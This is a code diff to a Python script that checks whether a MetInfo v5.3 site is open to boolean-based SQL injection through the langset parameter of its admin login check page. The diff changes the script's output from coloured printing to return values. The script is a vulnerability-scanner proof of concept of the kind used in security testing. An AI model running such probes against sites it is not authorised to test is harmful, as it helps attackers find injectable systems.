@@ -8,8 +8,8 @@ description: metinfo /admin/login/login_check.php?langset=cn 的langset 参数�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class metinfo_login_check_sqli_BaseVerify:
     def __init__(self, url):
@@ -26,11 +26,11 @@ class metinfo_login_check_sqli_BaseVerify:
             req1 = requests.get(true_url, headers=headers, timeout=10, verify=False)
             req2 = requests.get(false_url, headers=headers, timeout=10, verify=False)
             if r"not have this language" in req2.text and r"not have this language" not in req1.text:
-                cprint("[+]存在metinfo v5.3 SQL注入漏洞...(高危)\tpayload: "+false_url, "red")
+                return "[+]存在metinfo v5.3 SQL注入漏洞...(高危)\tpayload: "+false_url
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = metinfo_login_check_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
